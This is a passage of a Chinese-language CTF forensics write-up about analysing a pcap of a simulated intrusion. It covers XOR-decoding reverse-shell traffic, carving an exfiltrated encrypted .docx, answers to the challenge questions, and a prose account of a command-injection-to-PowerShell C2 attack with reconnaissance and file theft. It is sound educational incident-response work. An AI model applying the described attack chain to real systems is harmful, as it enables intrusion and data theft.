</span></span><span class="line"><span class="cl">                <span class="n">raw</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="s1">&#39;Raw&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">load</span>
</span></span><span class="line"><span class="cl">                <span class="n">xor_passwd</span> <span class="o">=</span> <span class="s2">&#34;x0R_&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">res</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">idx</span><span class="p">,</span> <span class="n">word</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">raw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">res</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">word</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">xor_passwd</span><span class="p">[</span><span class="n">idx</span><span class="o">%</span><span class="mi">4</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">                <span class="c1">#print(res, end=&#34;&#34;)</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在抓資料的過程順便解密+寫檔，順利的話結果會很~漂~亮~ <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF-CTF-2020/hw1/result.out" target="_blank" rel="noopener noreffer ">MacacaHub-result.out</a><br>
從結果來看可以發現駭客利用受害主機上傳了一份 <code>secret.docx</code> 到 C&amp;C Server，所以下一步我們要把檔案抓出來。</p>
<p>檔案一樣是藏在題目給的封包檔中，我自己在這個環節卡很久，事後聊才發現大部分朋友都是先把 word 檔撈出來XDDD<br>
至於 dump 的方式很多種，但我的方式自認蠻哈扣的，如果有更好的方法歡迎找我交流 QwQ</p>
<p>簡單提一下我當時卡住的點~<br>
由於打 CTF 偶爾會遇到 MS word 題，因此我的觀念上其 binary 標頭和壓縮檔一樣都是<code>PK</code>，也就是可以透過 <code>unzip</code> 指令把整個 word 拆成很多個 .xml 以及圖片檔案(如果內文有圖片的話)，因此我在整個 pcap 檔一直挖不到自己想像中的答案 &hellip; 。<br>
直到我最後自己測試開了一份加密過的 word 才發現完全不是這麼一回事，實際上只要把藏在封包裡的 binary 處理一下就能拿到 word，具體操作如下。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/04.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/04.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/04.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/04.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/04.png"
        title=" wireshark-word_packet" /></p>
<p>同樣用 <code>Follow &gt; TCP stream</code> 觀察，很容易找到這份看起來就是<strong>被</strong>處理過的資料，可以透過 <code>File &gt; Export Objects &gt; HTTP...</code> 把指定的封包 dump 出來。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/05.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/05.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/05.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/05.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/05.png"
        title=" wireshark-exports_object_http" /></p>
<p>這部分可以從檔案類型 &ldquo;multipart/form-data&rdquo; 辨別，然後存成 secret.docx 。<br>
再來你會發現&hellip; 雙擊點開檔案是爛掉ㄉ，這時就可以自己另外開一份加密過的 word，並把這兩份檔案用 十六進制編輯器 打開比較看看。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/06.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/06.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/06.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/06.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/06.png"
        title=" MS_word-hex_compare" /></p>
<p>如圖，左半部是我自己產生的加密 .docx，右半部則是從封包 dump 出來的檔案，應該不難看出 secret.docx 的檔頭混了很多額外資訊，可透過比對把 0x<code>D0CF</code> 之前的 hex 拿掉就能還原成正常的加密 .docx（至於檔尾只會讀到 <code>&lt;/encryption&gt;</code> 所以有沒有改動都不影響）。</p>
<p>啊 .docx 密碼勒？？</p>
<p>如果有成功把上一段XOR加密的封包還原，.docx 的密碼就藏在裡面 &hellip; 自己找&gt;_&lt;</p>
<h3 id="problem">Problem</h3>
<ol>
<li>受害主機的外部(實體) IP位址是?</li>
</ol>
<blockquote>
<p>140.117.169.233</p>
</blockquote>
<ol start="2">
<li>駭客C2主機所使用的IP位址和port?</li>
</ol>
<blockquote>
<p>45.79.159.73:39637</p>
</blockquote>
<ol start="3">
<li>C2主機是哪一家虛擬專屬主機(VPS)提供商所提供的?</li>
</ol>
<blockquote>
<p>Linode</p>
</blockquote>
<p>可以直接 Google &ldquo;whois&rdquo; 線上工具找網域的相關資訊，或是裝套件下指令查詢（如圖）
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/07.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/07.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/07.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/07.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/07.png"
        title=" command_line-whois " /></p>
<ol start="4">
<li>Reverse shell的TCP連線內容是用哪一種加密演算法加密? 加密金鑰是?</li>
</ol>
<blockquote>
<p>XOR cipher、x0R_</p>
</blockquote>
<ol start="5">
<li>受害主機所在的AD域的域名?</li>
</ol>
<blockquote>
<p>macaca.lab</p>
</blockquote>
<ol start="6">
<li>受害主機所在的AD域中的IP位址?</li>
</ol>
<blockquote>
<p>192.168.77.30</p>
</blockquote>
<ol start="7">
<li>AD域中的DNS主機的名稱與IP位址?</li>
</ol>
<blockquote>
<p>dc.macaca.lab、192.168.77.10</p>
</blockquote>
<ol start="8">
<li>網站產生漏洞原因是?</li>
</ol>
<blockquote>
<p>於網站中存在含有 RCE(Remote Code Execution) 的 command injection 漏洞，且針對輸入的參數並沒有進行格式檢查，導致駭客可以透過植入 C&amp;C 惡意程式洩漏資訊。</p>
</blockquote>
<ol start="9">
<li>上傳洩漏資料的網站所用的port?</li>
</ol>
<blockquote>
<p>42794</p>
</blockquote>
<ol start="10">
<li>flag是?</li>
</ol>
<blockquote>
<p>flag{p0w3rsh3ll_1s_funny}</p>
</blockquote>
<h3 id="extra">Extra</h3>
<div class="details admonition note open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">請嘗試完整說明此次駭客從利用網站漏洞到資料外洩的攻擊事件流程</div>
        </div>
    </div>
<p>推測原始網站的功能為 輸入 IP 回傳 Ping IP 的結果，但是由於網站後端並沒有針對輸入進行格式檢查，且存在 RCE 漏洞導致被駭客利用。</p>
<p>駭客攻擊思路如下：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/08.png"
        data-srcset="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/08.png, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/08.png 1.5x, https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/08.png 2x"
        data-sizes="auto"
        alt="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF-CTF-2020/hw1/pic/08.png"
        title=" " /></p>
<p>駭客先是使用 <code>dir</code> 指令成功讓網站執行並回傳資訊，確認 RCE 漏洞，再利用 PowerShell 不被 Windows 偵測的特性使用無檔案攻擊，將指令執行至 <a href="https://en.wikipedia.org/wiki/Active_Directory" target="_blank" rel="noopener noreffer ">AD</a> 中的子網域主機。在指令方面，駭客主要建立 C&amp;C Server 連線，並且將輸入指令以及回傳資訊透過 Get-Xor function 進行混淆，用意是增加資安人員在鑑識分析上的困難度。</p>
<p>駭客取得主機執行指令的使用者權限後進行搜集情資，包含查看當前使用者(whoami)、網卡資訊(ipconfig /all)、系統資訊(systeminfo)、列出arp紀錄(arp -a)，查看網域底下其他主機資訊(nslookup)，最後才開始針對目錄進行探索。</p>
<p>駭客從原目錄 <code>C:\Users\web\xampp\htdocs</code> 逐步移動到 <code>C:\Users\web\Desktop\_</code> 發現 passwords.txt 拿到 ftp、docx、sso 三組密碼，同時也在<code>C:\Users\web\Downloads</code> 底下找到 secret.docx，最後透過 PowerShell 指令將該檔案上傳至 C&amp;C Server。</p></div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2020-11-03</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nsysu-%E9%A7%AD%E5%AE%A2%E6%94%BB%E9%98%B2/">NSYSU 駭客攻防</a>,&nbsp;<a href="/tags/ctf-writeup/">CTF-Writeup</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/2020/2020-summer-conf-p3/" class="prev" rel="prev" title="[Sharing] 2020 Summer Conf. PART 3"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Sharing] 2020 Summer Conf. PART 3</a>
            <a href="/posts/2020/nsysu-htcf-midterm-writeups/" class="next" rel="next" title="[NSYSU 駭客攻防] Midterm Writeups">[NSYSU 駭客攻防] Midterm Writeups<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="utterances" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">utterances</a>.
            </noscript></div></article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.125.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://blog.cyris.tw" target="_blank">Cyris Tseng</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":20},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"Comment 💬","lightTheme":"github-light","repo":"yctseng1227/blog-comments"}}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
